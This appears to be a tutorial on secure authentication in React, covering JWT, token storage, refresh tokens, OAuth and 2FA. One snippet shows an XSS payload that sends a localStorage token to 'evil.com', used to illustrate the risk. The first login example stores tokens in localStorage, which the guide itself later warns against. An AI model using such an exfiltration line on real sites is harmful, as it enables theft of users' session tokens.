# Secure Authentication in React

## Core Concept

Authentication verifies user identity. Proper implementation prevents unauthorized access, token theft, and session hijacking.

---

## JWT (JSON Web Tokens)

Most common authentication method for SPAs:

```typescript
// JWT Structure
// header.payload.signature
// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

// Login flow
interface LoginResponse {
  accessToken: string;
  refreshToken: string;
  expiresIn: number;
}

async function login(email: string, password: string): Promise<LoginResponse> {
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  });

  if (!response.ok) {
    throw new Error('Login failed');
  }

  return response.json();
}

// React component
function LoginForm() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    try {
      const { accessToken, refreshToken } = await login(email, password);

      // Store tokens (see storage section below)
      localStorage.setItem('accessToken', accessToken);
      localStorage.setItem('refreshToken', refreshToken);

      // Redirect to dashboard
      navigate('/dashboard');
    } catch (error) {
      alert('Login failed');
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <input type="email" value={email} onChange={e => setEmail(e.target.value)} />
      <input type="password" value={password} onChange={e => setPassword(e.target.value)} />
      <button>Login</button>
    </form>
  );
}
```

---

## Token Storage Options

### **1. localStorage** ❌ Vulnerable to XSS

```typescript
// Can be accessed by any JavaScript
localStorage.setItem('token', accessToken);
const token = localStorage.getItem('token');

// If XSS vulnerability exists, attacker can steal:
<script>
  fetch('https://evil.com/steal?token=' + localStorage.getItem('token'));
</script>
```

### **2. sessionStorage** ❌ Still vulnerable to XSS

```typescript
sessionStorage.setItem("token", accessToken);
// Cleared when tab closes
// But still accessible to XSS
```

### **3. HttpOnly Cookies** ✅ Best option

```typescript
// Backend sets cookie
res.cookie("accessToken", token, {
  httpOnly: true, // Not accessible to JavaScript
  secure: true, // HTTPS only
  sameSite: "strict", // CSRF protection
  maxAge: 3600000, // 1 hour
});

// Frontend - browser sends automatically
fetch("/api/protected", {
  credentials: "include", // Send cookies
});

// Cannot be stolen via XSS! ✅
```

### **4. In-memory storage** ✅ Most secure

```typescript
// Store in React state/context
// Lost on page refresh (use refresh tokens)

const AuthContext = createContext<AuthState | null>(null);

function AuthProvider({ children }: { children: ReactNode }) {
  const [accessToken, setAccessToken] = useState<string | null>(null);

  // Load from httpOnly cookie on mount
  useEffect(() => {
    refreshAccessToken();
  }, []);

  return (
    <AuthContext.Provider value={{ accessToken, setAccessToken }}>
      {children}
    </AuthContext.Provider>
  );
}
```

---

## Refresh Token Pattern

```typescript
interface TokenResponse {
  accessToken: string;
  refreshToken: string;
}

let accessToken: string | null = null;
let refreshToken: string | null = null;

// Axios interceptor
import axios from "axios";

const api = axios.create({ baseURL: "/api" });

// Attach access token to requests
api.interceptors.request.use((config) => {
  if (accessToken) {
    config.headers.Authorization = `Bearer ${accessToken}`;
  }
  return config;
});

// Refresh on 401
api.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        // Refresh access token
        const response = await axios.post("/api/auth/refresh", {
          refreshToken,
        });

        accessToken = response.data.accessToken;

        // Retry original request
        originalRequest.headers.Authorization = `Bearer ${accessToken}`;
        return api(originalRequest);
      } catch (refreshError) {
        // Refresh failed - logout
        logout();
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  },
);

function logout() {
  accessToken = null;
  refreshToken = null;
  window.location.href = "/login";
}
```

---

## Auth Context

```typescript
import { createContext, useContext, useState, useEffect, ReactNode } from 'react';

interface User {
  id: string;
  email: string;
  name: string;
}

interface AuthContextType {
  user: User | null;
  loading: boolean;
  login: (email: string, password: string) => Promise<void>;
  logout: () => void;
}

const AuthContext = createContext<AuthContextType | undefined>(undefined);

export function AuthProvider({ children }: { children: ReactNode }) {
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);

  // Check auth status on mount
  useEffect(() => {
    checkAuth();
  }, []);

  const checkAuth = async () => {
    try {
      // Call API with httpOnly cookie
      const response = await fetch('/api/auth/me', {
        credentials: 'include'
      });

      if (response.ok) {
        const user = await response.json();
        setUser(user);
      }
    } catch (error) {
      console.error('Auth check failed:', error);
    } finally {
      setLoading(false);
    }
  };

  const login = async (email: string, password: string) => {
    const response = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include', // Set httpOnly cookie
      body: JSON.stringify({ email, password })
    });

    if (!response.ok) {
      throw new Error('Login failed');
    }

    const user = await response.json();
    setUser(user);
  };

  const logout = async () => {
    await fetch('/api/auth/logout', {
      method: 'POST',
      credentials: 'include'
    });
    setUser(null);
  };

  return (
    <AuthContext.Provider value={{ user, loading, login, logout }}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within AuthProvider');
  }
  return context;
}

// Usage
function ProtectedRoute({ children }: { children: ReactNode }) {
  const { user, loading } = useAuth();

  if (loading) return <Spinner />;
  if (!user) return <Navigate to="/login" />;

  return <>{children}</>;
}
```

---

## OAuth 2.0 / Social Login

```typescript
// Google OAuth example
function GoogleLogin() {
  const handleGoogleLogin = () => {
    // Redirect to Google OAuth
    const params = new URLSearchParams({
      client_id: process.env.REACT_APP_GOOGLE_CLIENT_ID!,
      redirect_uri: `${window.location.origin}/auth/callback`,
      response_type: 'code',
      scope: 'openid email profile'
    });

    window.location.href = `https://accounts.google.com/o/oauth2/v2/auth?${params}`;
  };

  return (
    <button onClick={handleGoogleLogin}>
      Login with Google
    </button>
  );
}

// Callback handler
function AuthCallback() {
  const [searchParams] = useSearchParams();

  useEffect(() => {
    const code = searchParams.get('code');

    if (code) {
      // Send code to backend
      fetch('/api/auth/google', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify({ code })
      }).then(() => {
        // Redirect to dashboard
        navigate('/dashboard');
      });
    }
  }, [searchParams]);

  return <div>Authenticating...</div>;
}
```

---

## Password Requirements

```typescript
function validatePassword(password: string): string[] {
  const errors: string[] = [];

  if (password.length < 12) {
    errors.push('Password must be at least 12 characters');
  }

  if (!/[A-Z]/.test(password)) {
    errors.push('Password must contain uppercase letter');
  }

  if (!/[a-z]/.test(password)) {
    errors.push('Password must contain lowercase letter');
  }

  if (!/[0-9]/.test(password)) {
    errors.push('Password must contain number');
  }

  if (!/[!@#$%^&*]/.test(password)) {
    errors.push('Password must contain special character');
  }

  return errors;
}

// Password strength indicator
function PasswordStrengthMeter({ password }: { password: string }) {
  const strength = calculateStrength(password);

  return (
    <div className="strength-meter">
      <div
        className={`bar ${strength}`}
        style={{ width: `${strength * 25}%` }}
      />
      <span>{['Weak', 'Fair', 'Good', 'Strong'][strength - 1]}</span>
    </div>
  );
}
```

---

## Two-Factor Authentication (2FA)

```typescript
// Enable 2FA
function Enable2FA() {
  const [qrCode, setQrCode] = useState('');
  const [secret, setSecret] = useState('');

  const setup2FA = async () => {
    const response = await fetch('/api/auth/2fa/setup', {
      method: 'POST',
      credentials: 'include'
    });

    const data = await response.json();
    setQrCode(data.qrCodeUrl);
    setSecret(data.secret);
  };

  const verify2FA = async (code: string) => {
    const response = await fetch('/api/auth/2fa/verify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify({ code })
    });

    if (response.ok) {
      alert('2FA enabled!');
    }
  };

  return (
    <div>
      <button onClick={setup2FA}>Setup 2FA</button>
      {qrCode && <img src={qrCode} alt="QR Code" />}
      {secret && <code>{secret}</code>}
    </div>
  );
}

// Login with 2FA
function Login2FA() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [code, setCode] = useState('');
  const [needs2FA, setNeeds2FA] = useState(false);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();

    const response = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, code })
    });

    if (response.status === 202) {
      // Needs 2FA code
      setNeeds2FA(true);
    } else if (response.ok) {
      navigate('/dashboard');
    }
  };

  return (
    <form onSubmit={handleLogin}>
      <input type="email" value={email} onChange={e => setEmail(e.target.value)} />
      <input type="password" value={password} onChange={e => setPassword(e.target.value)} />

      {needs2FA && (
        <input
          placeholder="2FA Code"
          value={code}
          onChange={e => setCode(e.target.value)}
        />
      )}

      <button>Login</button>
    </form>
  );
}
```

---

## Best Practices

✅ **Use httpOnly cookies** for tokens  
✅ **Implement refresh tokens** for long sessions  
✅ **Enable HTTPS** - always  
✅ **Hash passwords** with bcrypt (backend)  
✅ **Implement rate limiting** on login  
✅ **Require strong passwords** (12+ characters)  
✅ **Support 2FA** for sensitive accounts  
✅ **Log security events** (login attempts, password changes)  
❌ **Don't store tokens in localStorage** - XSS risk  
❌ **Don't send passwords in URL** - use POST body  
❌ **Don't implement your own crypto** - use libraries

---

## Security Checklist

- [ ] Tokens in httpOnly cookies
- [ ] HTTPS enforced
- [ ] Refresh token rotation
- [ ] Password strength requirements
- [ ] Rate limiting on auth endpoints
- [ ] 2FA available
- [ ] Account lockout after failed attempts
- [ ] Secure password reset flow
- [ ] Session timeout implemented
- [ ] Audit logging enabled

---

## Key Takeaways

1. **Use httpOnly cookies** to prevent XSS token theft
2. **Implement refresh tokens** for persistent sessions
3. **Never store sensitive data** in localStorage
4. **Require strong passwords** and offer 2FA
5. **Use OAuth 2.0** for social login
6. **Implement rate limiting** on auth endpoints
7. **Always use HTTPS** - no exceptions
